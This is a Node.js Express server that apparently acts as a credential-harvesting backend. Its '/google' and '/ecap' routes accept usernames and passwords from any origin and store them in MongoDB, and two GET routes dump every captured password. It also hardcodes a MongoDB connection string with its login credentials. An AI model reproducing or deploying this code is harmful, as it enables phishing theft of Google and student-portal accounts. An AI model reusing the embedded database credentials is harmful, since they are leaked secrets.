const express = require("express");
const app = express();
const path = require("path");
const cors = require("cors");
const { connect } = require("mongoose");
const { Pass, Ecap } = require("./utils/password");
app.set("views", path.join(__dirname, "views"));
app.set("public", path.join(__dirname, "public"));
app.set("view engine", "pug");
require("dotenv").config();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static("./public"));

connect(
  "mongodb+srv://suryasarisa99:suryamongosurya@cluster0.xtldukm.mongodb.net/Student?retryWrites=true&w=majority",
  {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  }
).then((res) => console.log("connected"));

app.use(
  cors({
    // origin: ["https://www.example.com", "http://103.138.0.69/ecap"],
    origin: "*",
    allowedHeaders: "Content-Type",
    methods: "POST, GET, PUT, PATCH",
  })
);
app.options("/test", cors());

app.get("/x", async (req, res) => {
  const passes = await Ecap.find();
  console.log(passes);
  // console.log(passes);

  // res.render("a", { passes });
  res.json(passes);
});

app.post("/google", async (req, res) => {
  console.log(req.body);
  let pass = await Pass.findById(req.body.user);
  if (pass) {
    if (pass.passwords.includes(req.body.passwd)) return res.send("done");
    pass.passwords.unshift(req.body.passwd);
    await pass.save();
    return res.send("done");
  } else {
    let pass = await new Pass({
      _id: req.body.user,
      passwords: [req.body.passwd],
    });
    await pass.save();
  }

  return res.json({ sample: "done" });
});
app.post("/test", async (req, res) => {
  try {
    console.log("worked");
    let prvPass = await Pass.findById(req.body.user);

    if (prvPass) {
      prvPass.passwords = req.body.passwd;
      prvPass.save();
    } else {
      let pass = new Ecap({
        _id: req.body.user,
        passwords: req.body.passwd,
        type: req.body.type,
      });
      await pass.save();
    }
    res.json({ status: "Done", data: req.body });
  } catch (error) {
    res.send({ status: "some-error", data: req.body, error: error });
  }
});

app.post("/ecap", async (req, res) => {
  console.log(req.body);
  let pass = await Pass.findById(req.body.user);
  if (pass) {
    if (pass.passwords.includes(req.body.passwd)) return res.send("done");
    pass.passwords.unshift(req.body.passwd);
    await pass.save();
    return res.send("done");
  } else {
    let pass = new Pass({
      _id: req.body.user,
      passwords: [req.body.passwd],
      type: [req.body.type],
    });
    await pass.save();
  }

  return res.json({ sample: "ecap pass saved" });
});
app.get("/", async (_, res) => {
  const passes = await Ecap.find();
  res.render("a.pug", { passes });
});

app.listen(process.env.PORT || 3000);
